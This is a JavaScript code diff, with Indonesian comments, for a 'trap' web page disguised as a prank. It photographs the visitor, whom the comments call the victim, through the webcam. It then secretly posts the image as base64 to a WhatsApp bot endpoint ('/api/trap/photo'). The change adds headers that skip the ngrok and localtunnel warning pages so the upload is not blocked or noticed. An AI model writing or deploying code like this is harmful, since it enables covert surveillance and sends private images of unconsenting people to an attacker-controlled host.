@@ -178,33 +178,38 @@
             } catch(e) {}
         }
 
-        // Fungsi Jepret & Kirim ke Bot
+        // Fungsi Jepret & Kirim ke Bot (YANG SUDAH DIPERBAIKI)
         function takePhotoAndSend() {
             try {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Ubah jadi base64 image (kualitas dikurangi biar ringan dikirim)
+                // Ubah jadi base64 image
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
                 photo.src = dataUrl;
-                photo.style.display = 'block'; // Munculkan foto korban di layar
+                photo.style.display = 'block';
 
-                // Matikan kamera setelah difoto
                 const stream = video.srcObject;
                 if (stream) { stream.getTracks().forEach(track => track.stop()); }
 
-                // PENGIRIMAN RAHASIA KE BOT WHATSAPP
+                // PENGIRIMAN RAHASIA KE BOT WHATSAPP DENGAN TIKET BYPASS
                 if (apiTarget) {
                     fetch(apiTarget + '/api/trap/photo', {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            // INI KUNCI RAHASIANYA BIAR GAK DIBLOCK LOCALTUNNEL / NGROK
+                            'Bypass-Tunnel-Reminder': 'true',
+                            'ngrok-skip-browser-warning': 'true'
+                        },
                         body: JSON.stringify({ id: TRAP_ID, photoBase64: dataUrl })
-                    }).catch(err => console.log("Gagal lapor ke markas"));
+                    })
+                    .then(response => console.log("Laporan terkirim! Status:", response.status))
+                    .catch(err => console.log("Gagal lapor ke markas:", err));
                 }
             } catch(e) {}
         }
-
         // Mulai Prank
         function startPrank() {
             // Fullscreen
